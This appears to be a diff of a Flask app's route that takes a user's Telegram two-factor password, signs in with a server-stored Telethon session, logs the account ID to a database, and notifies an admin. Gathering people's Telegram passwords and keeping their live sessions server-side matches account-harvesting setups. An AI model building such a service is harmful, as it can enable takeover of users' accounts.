@@ -163,41 +163,43 @@ def verify_password():
     phone = data.get("phone")
     password = data.get("password")
 
-    if phone not in pending:
-        return jsonify({"status": "no_session"})
-
-    client = pending[phone]["client"]
-
     try:
-        client.sign_in(password=password)
-    except Exception:
+        async def work():
+            client = TelegramClient(
+                session_path(phone),
+                API_ID,
+                API_HASH
+            )
+            await client.connect()
+
+            await client.sign_in(password=password)
+
+            me = await client.get_me()
+            await client.disconnect()
+            return me
+
+        me = run_async(work())
+
+        # 🔽 DB GA YOZISH (ENG MUHIM JOY)
+        user_id = str(me.id)
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO authorized_users (user_id)
+            VALUES (%s)
+            ON CONFLICT (user_id) DO NOTHING
+        """, (user_id,))
+        conn.commit()
+        conn.close()
+
+        pending.pop(phone, None)
+
+        return jsonify({"status": "success"})
+
+    except Exception as e:
+        print("VERIFY PASSWORD ERROR:", e)
         return jsonify({"status": "invalid_password"})
 
-    return finalize_login(client, phone)
-
-# ======================
-# FINAL LOGIN
-# ======================
-
-def finalize_login(client, phone):
-    me = client.get_me()
-    user_id = str(me.id)
-
-    conn = get_db()
-    cur = conn.cursor()
-    cur.execute("""
-        INSERT INTO authorized_users (user_id, phone)
-        VALUES (%s, %s)
-        ON CONFLICT (user_id)
-        DO UPDATE SET phone = EXCLUDED.phone
-    """, (user_id, phone))
-    conn.commit()
-    conn.close()
-
-    client.disconnect()
-    pending.pop(phone, None)
-
-    return jsonify({"status": "success"})
 
 def notify_admin(user_id: str, phone: str, username: str | None = None):
     async def _send():
@@ -223,6 +225,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
